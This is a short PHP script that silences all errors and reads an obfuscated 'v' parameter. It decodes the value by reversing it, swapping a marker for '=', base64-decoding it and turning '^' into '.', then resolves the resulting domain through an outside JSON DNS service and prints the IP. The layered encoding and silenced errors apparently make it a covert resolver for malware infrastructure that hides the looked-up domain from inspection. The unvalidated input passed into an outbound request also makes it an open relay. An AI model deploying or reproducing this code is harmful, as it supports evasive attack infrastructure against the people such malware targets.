<?php

error_reporting(false);
ini_set('display_errors',0);


$domb =  str_replace("^",".",strrev(base64_decode(str_replace("REHAlEMInTheBOx","=",strrev($_GET['v'])))));


#$domb = 'google.com';
$nb = file_get_contents("http://dig.jsondns.org/IN/$domb/A");

$nb = json_decode($nb,true);

echo $nb['answer'][0]['rdata'];
?>
